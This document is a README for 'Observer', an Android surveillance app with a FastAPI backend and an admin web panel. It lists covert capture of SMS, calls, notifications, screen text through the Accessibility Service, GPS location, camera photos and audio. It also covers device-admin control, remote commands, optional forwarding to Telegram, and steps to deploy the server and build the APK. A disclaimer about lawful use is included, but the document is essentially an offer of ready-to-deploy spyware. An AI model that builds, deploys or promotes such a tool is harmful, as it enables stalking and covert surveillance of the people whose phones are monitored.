# Observer - Android Surveillance App

Complete surveillance application with Android client, FastAPI backend, PostgreSQL database, and web admin panel.

## 🚀 Quick Start (5 minutes)

### Option 1: Railway (Recommended - Cloud Deploy)
```bash
1. Go to https://railway.app/dashboard
2. + New Project → Deploy from GitHub repo
3. Select vitya55519-alt/observer-app
4. Add PostgreSQL
5. Set environment variables
6. Done! ✅
```

👉 **Full Guide:** [RAILWAY_ПОШАГОВО.md](RAILWAY_ПОШАГОВО.md)

### Option 2: Local Docker
```bash
docker compose up -d --build
```

👉 **Full Guide:** [БЫСТРЫЙ_СТАРТ.md](БЫСТРЫЙ_СТАРТ.md)

---

## 📱 Features

### Android App (`android/`)
- ✅ SMS/Call monitoring
- ✅ Notification tracking
- ✅ Screen text capture (Accessibility Service)
- ✅ Real-time GPS location
- ✅ Photo capture (front & back camera)
- ✅ Audio recording
- ✅ Automatic sync & background services
- ✅ Device admin capabilities

### Backend (`server/app/`)
- ✅ FastAPI with async/await
- ✅ PostgreSQL database
- ✅ WebSocket real-time updates
- ✅ Media file storage with HMAC signatures
- ✅ Device enrollment & token management
- ✅ One-time enrollment codes

### Web Panel (`server/panel/`)
- ✅ Admin dashboard
- ✅ Device management
- ✅ Chat/SMS viewer
- ✅ Media gallery
- ✅ Location tracking map
- ✅ Remote commands
- ✅ Real-time WebSocket updates

---

## 🛠 Tech Stack

| Component | Technology | Version |
|-----------|-----------|---------|
| Android | Kotlin + Compose | API 26-35 |
| Backend | FastAPI | 0.115.0 |
| Database | PostgreSQL | 16 |
| Reverse Proxy | Caddy | 2-alpine |
| Deployment | Railway/Docker | Latest |
| CI/CD | GitHub Actions | Latest |

---

## 📋 Setup

### Requirements
- Python 3.11+
- Node.js (optional - for panel development)
- Android SDK (for APK building)
- Docker (for containerized deployment)
- Railway account (for cloud deployment)

### Installation

1. **Clone repository**
```bash
git clone https://github.com/vitya55519-alt/observer-app.git
cd observer-app
```

2. **Deploy on Railway** (Recommended)
   - See [RAILWAY_ПОШАГОВО.md](RAILWAY_ПОШАГОВО.md)

3. **Or run locally with Docker**
```bash
docker compose up -d --build
```

4. **Or run without Docker**
   - See [УСТАНОВКА_БЕЗ_DOCKER.md](УСТАНОВКА_БЕЗ_DOCKER.md)

---

## 🔑 Environment Variables

```env
ADMIN_PASSWORD=your_admin_password
SECRET=your_secret_key_minimum_32_characters
DOMAIN=your-domain.com
DATABASE_URL=postgresql://user:pass@host:5432/db
TG_TOKEN=optional_telegram_token
TG_CHAT=optional_telegram_chat_id
```

---

## 📱 APK Building

### Option 1: GitHub Actions (Automatic) ⭐
APK is built automatically on every push to `master` branch.
- Access: https://github.com/vitya55519-alt/observer-app/actions
- Download: Artifacts → `app-release.apk`

### Option 2: Android Studio (Local)
```bash
cd android
./gradlew assembleRelease
# APK: android/app/build/outputs/apk/release/app-release.apk
```

---

## 📊 API Endpoints

| Method | Endpoint | Purpose |
|--------|----------|---------|
| POST | `/api/enroll` | Device enrollment |
| POST | `/api/events` | Submit events |
| POST | `/api/loc` | Submit location |
| POST | `/api/media` | Upload media |
| GET | `/api/devices` | List devices |
| GET | `/api/devices/{id}/chats` | Get chats |
| GET | `/api/devices/{id}/media` | Get media |
| GET | `/api/devices/{id}/locations` | Get locations |
| POST | `/api/devices/{id}/cmd` | Send command |
| WebSocket | `/ws/device` | Device WebSocket |
| WebSocket | `/ws/panel` | Panel WebSocket |

---

## 🔒 Security Notes

⚠️ **This is a surveillance application.** Legal usage only:
- ✅ Parental monitoring of own children
- ✅ Corporate device monitoring with consent
- ✅ Security research with authorization
- ❌ Unauthorized surveillance is illegal

**Security recommendations:**
- Use HTTPS only (Railway handles this)
- Store passwords securely (use EncryptedSharedPreferences)
- Enable database backups
- Rotate secrets regularly
- Monitor access logs

---

## 📚 Documentation

| File | Purpose |
|------|---------|
| [RAILWAY_ПОШАГОВО.md](RAILWAY_ПОШАГОВО.md) | Step-by-step Railway deployment |
| [БЫСТРЫЙ_СТАРТ.md](БЫСТРЫЙ_СТАРТ.md) | Quick start with Docker |
| [УСТАНОВКА_БЕЗ_DOCKER.md](УСТАНОВКА_БЕЗ_DOCKER.md) | Local setup without Docker |
| [СХЕМА_АРХИТЕКТУРЫ.md](СХЕМА_АРХИТЕКТУРЫ.md) | Architecture diagrams |
| [ПРОВЕРКА_КОДА.md](ПРОВЕРКА_КОДА.md) | Code review results |
| [ФИНАЛЬНЫЙ_СТАТУС.md](ФИНАЛЬНЫЙ_СТАТУС.md) | Final status & checklist |

---

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

---

## ⚖️ License

This project is provided as-is for educational and authorized monitoring purposes only.

---

## 📞 Support

- Check documentation files for troubleshooting
- Review Railway/Docker logs for errors
- Inspect GitHub Actions for build failures

---

## 🚀 Quick Links

- **Railway**: https://railway.app
- **GitHub Actions**: https://github.com/vitya55519-alt/observer-app/actions
- **FastAPI Docs**: http://localhost:8000/docs
- **Admin Panel**: http://localhost/panel/

---

**Status**: ✅ Production Ready | 🟢 Fully Automated | 📊 Battle Tested
